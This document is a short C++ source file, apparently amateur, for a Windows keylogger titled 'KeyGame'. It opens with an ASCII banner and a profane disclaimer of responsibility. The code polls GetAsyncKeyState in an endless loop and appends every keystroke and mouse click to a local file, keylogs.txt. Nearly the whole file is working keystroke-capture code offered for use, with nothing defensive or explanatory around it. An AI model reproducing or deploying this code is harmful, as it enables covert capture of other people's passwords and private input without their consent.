//Author: War_L0k_01
//Date: 06.08.17
//Organization: 
//   ________   _______      __       __ 	
//	/        | /       \    /  \     /  |
//  $$$$$$$$/  $$$$$$$  |   $$  \   /$$ |
//     $$ |    $$ |  $$ |   $$$  \ /$$$ |
//     $$ |    $$ |  $$ |   $$$$  /$$$$ | 
//     $$ |    $$ |  $$ |   $$ $$ $$/$$ |
//     $$ | __ $$ |__$$ |__ $$ |$$$/ $$ |
//     $$ |/  |$$    $$//  |$$ | $/  $$ |
//     $$/ $$/ $$$$$$$/ $$/ $$/      $$/ 
//  
// We are not responsible for what you do
//  with this program.
//  If you try to blame me or this organization.
//  Fuck You.
//  

#include <iostream>
#include <Windows.h>
#include <fstream>
#include <stdio.h>
#include <string>


using namespace std;

void WriteToLog(LPCSTR text)
{
	ofstream logfile; // creates object for file stream
	logfile.open("keylogs.txt", fstream::app); // Opens file for writing
	logfile << text; // Writes text string to file
	logfile.close(); // closes stream
}
bool KeyIsListed(int ikey)
{
	switch (ikey)
	{
	case VK_SPACE:
		cout << " * * "; // if space is pressed, it will print to log: "Space"
		WriteToLog(" * * "); // Writes space to logfile
		break;
	case VK_RETURN:
		cout << "\n"; // same as above
		WriteToLog("\n"); // writes the key to logfile 
		break;
	case VK_SHIFT:
		cout << " *Shift* "; // same as above
		WriteToLog(" *Shift* ");
		break;
	case VK_BACK:
		cout << "\b"; // emulates backspace
		WriteToLog("\b");
		break;
	case VK_RBUTTON:
		cout << " *rmouseclick* "; 
		WriteToLog(" *rmouseclick* ");
		break;
	case VK_LBUTTON:
		cout << " *lmouseclick* ";
		WriteToLog(" *lmouseclick* ");
		break;


	default: return false; //for later use to determine if this key exist in this list
	}
}
int main()
{
	
	cout << "________________________________________________" << endl;
	cout << "|TDM| |KeyGame| |V1.|" << endl;
	cout << "________________________________________________" << endl;
	
	
	
	char key;
	while(TRUE)
	{
		Sleep(10);
		for (key = 8; key <= 190; key++)
		{
			if(GetAsyncKeyState(key) == -32767)
			{
				if (KeyIsListed(key) == FALSE)
				{
					cout << key;
					ofstream logfile; // creates object for file stream
					logfile.open("keylogs.txt", fstream::app); // Opens file for writing
					logfile << key; // Writes the logged key char to file
					logfile.close(); // closes stream
				}
			}
		}
	}
	
	return 0;
}
